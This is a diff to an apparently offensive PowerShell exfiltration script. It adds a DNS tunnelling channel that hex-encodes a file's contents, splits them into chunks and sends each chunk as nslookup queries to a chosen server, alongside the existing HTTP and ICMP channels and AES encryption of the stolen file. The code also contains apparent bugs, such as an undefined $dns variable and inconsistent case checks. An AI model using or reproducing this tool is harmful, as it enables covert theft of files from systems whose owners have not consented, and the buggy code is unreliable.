@@ -19,8 +19,33 @@ function Send-ICMPPacket {
     Start-Sleep -s 1;
 };
 
+function Send-DNSRequest {
+    param ([string] $server, [string] $data, [string] $jobid)
+    $data = Convert-ToCHexString $data  
+    $len = $data.Length;
+    $split = 66 - $len.Length - $dns.Length;
+    # get the size of the file and split it
+    $repeat=[Math]::Floor($len/($split));
+    $remainder=$len%$split;
+    if($remainder){ 
+        $repeat = $repeat + 1
+    };
+    
+    for($i=0; $i-lt$repeat; $i++){
+        $str = $data.Substring($i*$Split,$Split);
+        $str = $jobid + $str + '.' + $dns;
+        $q = nslookup -querytype=A $str $server;
+    };
+    if($remainder){
+        $str = $data.Substring($len-$remainder);
+        $str = $jobid + $str + '.' + $dns;
+        $q = nslookup -querytype=A $str $server;
+    };
+};
+
+
 function Invoke-Exfil {
-    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type)
+    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns)
     $bytes = [System.IO.File]::ReadAllBytes($file)
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
@@ -32,8 +57,14 @@ function Invoke-Exfil {
     $string = $string -replace '-','';
     $filename = Split-Path $file -leaf
     $len = $string.Length;
-    #$split = Get-Random -minimum 1 -maximum 250;
-    $split = 300
+    #$split = 300
+    If ($type -eq 'dns') {
+     $split = 66 - $len.Length - $dns.Length;
+    }
+    Else {
+    $split = Get-Random -minimum 150 -maximum 500;
+    }
+
     $id = 0
     $repeat=[Math]::Ceiling($len/$split);
     $remainder=$len%$split;
@@ -42,8 +73,31 @@ function Invoke-Exfil {
 
 
     # determine exfil type and send data;
+	
 
-    If ($type -eq 'HTTP') {
+
+    If ($type -eq 'DNS') {
+
+        $q = Send-DNSRequest $server $data $jobid
+        for($i=0; $i-lt($repeat-1); $i++){
+            $str = $string.Substring($i * $Split, $Split);
+            $data = $jobid + '|!|' + $i + '|!|' + $str
+            $q = Send-DNSRequest $server $data $jobid
+        };
+        if($remainder){
+            $str = $string.Substring($len-$remainder);
+            $i = $i +1
+            $data = $jobid + '|!|' + $i + '|!|' + $str
+            $q = Send-DNSRequest $server $data $jobid
+        };
+    
+        $i = $i + 1
+        $data = $jobid + '|!|' + $i + '|!|DONE'
+        $q = Send-DNSRequest $server $data $jobid
+       }	
+
+
+    ElseIf ($type -eq 'HTTP') {
         $q = Send-HTTPRequest $data $IE
         for($i=0; $i-lt$repeat-1; $i++){
             $str = $string.Substring($i * $Split, $Split);
@@ -51,7 +105,6 @@ function Invoke-Exfil {
             $q = Send-HTTPRequest $data $IE
         };
         if($remainder){
-            echo $string
             $str = $string.Substring($len-$remainder);
             $i = $i +1
             $data = $jobid + '|!|' + $i + '|!|' + $str
@@ -81,7 +134,7 @@ function Invoke-Exfil {
         $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-ICMPPacket $data
         };
-        }
+       } 
 
   
 function Base64 {
@@ -97,7 +150,7 @@ function AES {
     $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $AES.BlockSize = 128
     $AES.KeySize = 256
-    $AES.Padding = "PKCS7"
+	$AES.Padding = "PKCS7"
     $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))
     $IV = new-object "System.Byte[]" 16
     $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
